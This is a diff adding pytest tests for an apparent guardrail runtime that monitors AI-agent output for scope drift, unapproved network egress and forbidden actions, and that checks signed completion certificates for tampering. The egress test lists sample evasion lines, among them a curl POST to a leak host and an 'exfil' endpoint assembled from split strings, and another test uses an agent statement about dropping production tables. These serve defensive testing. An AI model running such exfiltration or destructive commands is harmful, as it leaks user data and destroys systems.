@@ -358,3 +358,231 @@ def test_empty_or_whitespace_prompt_rejection():
 
     with pytest.raises(ValueError, match="cannot be empty"):
         compiler.compile_raw_intent("   \t\n  ")
+
+
+def test_zero_drift_sentry_preventative_statements_no_false_positive():
+    """Verifies Sentry does not trigger false positives on preventative/negated statements."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    sentry = ZeroDriftSentry()
+
+    compliant_statements = [
+        "Confirmed zero unapproved external network dependencies exist in this module.",
+        "Prevented scope creep across all components by strictly adhering to intent contract P.",
+        "Executed the entire verification suite without the tests failing.",
+        "Rejected the proposed analytics microservice because it was out of scope.",
+        "Ensured no unapproved external dependencies were added during optimization.",
+    ]
+
+    for statement in compliant_statements:
+        verdict = sentry.evaluate_drift(plan.protected_intent, statement)
+        assert verdict.is_drift_detected is False, f"False positive on: {statement}"
+        assert verdict.semantic_distance == 0.0
+        assert verdict.drift_type == DriftType.NO_DRIFT
+
+
+def test_zero_drift_sentry_obfuscated_egress_and_dynamic_imports():
+    """Verifies Sentry catches obfuscated egress and dynamic network import vectors."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    sentry = ZeroDriftSentry()
+
+    evasions = [
+        "module = __import__('urllib')",
+        "import socket; s = socket.create_connection(('192.168.1.1', 8080))",
+        "const socket = new WebSocket('wss://telemetry.example.com/stream')",
+        "endpoint = 'http' + '://exfil.example.org/api'",
+        "os.system('curl -X POST https://api.leak.org/data')",
+    ]
+
+    for evasion in evasions:
+        with pytest.raises(SemanticDriftViolationError) as exc:
+            sentry.evaluate_drift(plan.protected_intent, evasion)
+        assert exc.value.verdict.is_drift_detected is True
+        assert exc.value.verdict.drift_type == DriftType.UNAUTHORIZED_DEPENDENCY
+
+
+def test_zero_drift_sentry_custom_forbidden_actions_enforcement():
+    """Verifies Sentry detects violations of custom forbidden actions declared in ProtectedIntent."""
+    compiler = MetaPromptCompiler()
+    base_plan = compiler.compile_raw_intent("optimize user database query")
+    sentry = ZeroDriftSentry()
+
+    # Create intent with custom forbidden action
+    custom_intent = dataclasses.replace(
+        base_plan.protected_intent,
+        forbidden_actions=("Do not drop production database tables", "Do not alter database schema"),
+        intent_digest="",
+    )
+
+    violating_output = "I will drop production database tables to reset the environment for benchmarking."
+    with pytest.raises(SemanticDriftViolationError) as exc:
+        sentry.evaluate_drift(custom_intent, violating_output)
+
+    assert exc.value.verdict.is_drift_detected is True
+    assert exc.value.verdict.drift_type == DriftType.SCOPE_CREEP
+    assert any("drop production database tables" in r.lower() for r in exc.value.verdict.reasons)
+
+
+def test_completion_certificate_tamper_detection_attributes():
+    """Verifies certificate verify() fails if any dataclass attribute is tampered with."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    harness = SelfVerifyingCompletionHarness()
+
+    cert = harness.verify_and_finalize(
+        plan,
+        {
+            "ob_security": PredicateValue.TRUE,
+            "ob_latency": PredicateValue.TRUE,
+            "ob_regression": PredicateValue.TRUE,
+            "cost_nanos": 100_000_000,
+        },
+    )
+    assert cert.verify() is True
+
+    # 1. Tamper with cost_nanos attribute
+    tampered_cost = dataclasses.replace(cert, cost_nanos=999_999_999)
+    assert tampered_cost.verify() is False
+
+    # 2. Tamper with plan_digest attribute
+    tampered_plan = dataclasses.replace(cert, plan_digest="00" * 32)
+    assert tampered_plan.verify() is False
+
+    # 3. Tamper with verdict attribute
+    tampered_verdict = dataclasses.replace(cert, verdict=VerificationVerdict.COUNTEREXAMPLE_FOUND)
+    assert tampered_verdict.verify() is False
+
+    # 4. Tamper with certificate_id attribute
+    tampered_id = dataclasses.replace(cert, certificate_id="cert-forged-999")
+    assert tampered_id.verify() is False
+
+    # 5. Tamper with signature
+    tampered_sig = dataclasses.replace(cert, signature_ed25519="00" * 64)
+    assert tampered_sig.verify() is False
+
+
+def test_plan_digest_tamper_detection():
+    """Verifies that modifying plan attributes breaks the cryptographic plan digest."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    assert plan.plan_digest != ""
+
+    # Tampering with admissible_tools while retaining the old plan_digest raises ValueError
+    from spe_runtime.prompt.meta_compiler import AdmissibleTools
+    tampered_tools = AdmissibleTools(
+        allowed_tools=("curl", "wget", "arbitrary_egress"),
+        network_egress_allowed=True,
+    )
+    with pytest.raises(ValueError, match="Mismatched plan_digest"):
+        dataclasses.replace(plan, admissible_tools=tampered_tools)
+
+
+def test_deep_immutability_against_container_mutations():
+    """Verifies that mutating external input lists does not corrupt internal state."""
+    mutable_invariants = ["Invariant 1", "Invariant 2"]
+    mutable_forbidden = ["Do not hack"]
+
+    intent = ProtectedIntent(
+        raw_prompt="test prompt",
+        objective="Test objective.",
+        invariants=mutable_invariants,  # type: ignore[arg-type]
+        forbidden_actions=mutable_forbidden,  # type: ignore[arg-type]
+        domain="auth_security",
+    )
+
+    # Mutate the source list
+    mutable_invariants.append("Malicious Invariant Added Later")
+    assert len(intent.invariants) == 2
+    assert "Malicious Invariant Added Later" not in intent.invariants
+    assert isinstance(intent.invariants, tuple)
+
+
+def test_harness_evaluates_rich_witness_and_verdict_types():
+    """Verifies harness correctly resolves rich witness types and VerificationVerdict."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    harness = SelfVerifyingCompletionHarness()
+
+    rich_state = {
+        "ob_security": VerificationVerdict.PROVEN_WITHIN_FORMAL_SCOPE,
+        "ob_latency": {"status": "PASSED", "p99_ms": 1.4},
+        "ob_regression": {"verified": True},
+        "cost_nanos": 50_000_000,
+    }
+
+    cert = harness.verify_and_finalize(plan, rich_state)
+    assert cert.verify() is True
+    assert cert.obligation_results["ob_security"] == PredicateValue.TRUE
+    assert cert.obligation_results["ob_latency"] == PredicateValue.TRUE
+    assert cert.obligation_results["ob_regression"] == PredicateValue.TRUE
+
+
+def test_harness_csc_crucible_counterfactual_rejection():
+    """Verifies harness refuses completion when CSC counterfactual challenge finds a counterexample."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent("fix my auth token bug and make it fast")
+    harness = SelfVerifyingCompletionHarness()
+
+    state_with_counterexample = {
+        "ob_security": PredicateValue.TRUE,
+        "ob_latency": PredicateValue.TRUE,
+        "ob_regression": PredicateValue.TRUE,
+        "csc_verdict": VerificationVerdict.COUNTEREXAMPLE_FOUND,
+    }
+
+    with pytest.raises(CompletionRejectedError) as exc:
+        harness.verify_and_finalize(plan, state_with_counterexample)
+
+    err = exc.value
+    assert "ob_counterfactual_crucible" in err.unmet_obligations
+    delta = err.missing_witness_delta["ob_counterfactual_crucible"]
+    assert delta["status"] == "FALSE"
+    assert "counterexample" in delta["description"].lower()
+
+
+def test_harness_budget_overrun_rejection():
+    """Verifies harness refuses completion if cost_nanos exceeds protected intent budget."""
+    compiler = MetaPromptCompiler()
+    plan = compiler.compile_raw_intent(
+        "fix my auth token bug and make it fast",
+        budget_nanos=100_000_000,  # $0.10 budget
+    )
+    harness = SelfVerifyingCompletionHarness()
+
+    overrun_state = {
+        "ob_security": PredicateValue.TRUE,
+        "ob_latency": PredicateValue.TRUE,
+        "ob_regression": PredicateValue.TRUE,
+        "cost_nanos": 150_000_000,  # $0.15 cost (exceeded!)
+    }
+
+    with pytest.raises(CompletionRejectedError) as exc:
+        harness.verify_and_finalize(plan, overrun_state)
+
+    err = exc.value
+    assert "ob_financial_budget" in err.unmet_obligations
+    delta = err.missing_witness_delta["ob_financial_budget"]
+    assert delta["status"] == "FALSE"
+    assert "exceeded" in delta["description"].lower()
+
+
+def test_domain_hint_normalization_and_prompt_synthesis():
+    """Verifies domain hints are normalized to canonical domain profiles."""
+    compiler = MetaPromptCompiler()
+
+    plan_auth = compiler.compile_raw_intent("check this component", domain_hint="auth")
+    assert plan_auth.protected_intent.domain == "auth_security"
+
+    plan_db = compiler.compile_raw_intent("optimize query", domain_hint="db")
+    assert plan_db.protected_intent.domain == "database_optimization"
+
+    plan_web = compiler.compile_raw_intent("render page", domain_hint="web")
+    assert plan_web.protected_intent.domain == "web_frontend"
+
+    plan_perf = compiler.compile_raw_intent("make it fast", domain_hint="perf")
+    assert plan_perf.protected_intent.domain == "performance_tuning"
+
+    plan_arch = compiler.compile_raw_intent("decouple components", domain_hint="architecture")
+    assert plan_arch.protected_intent.domain == "system_architecture"
+
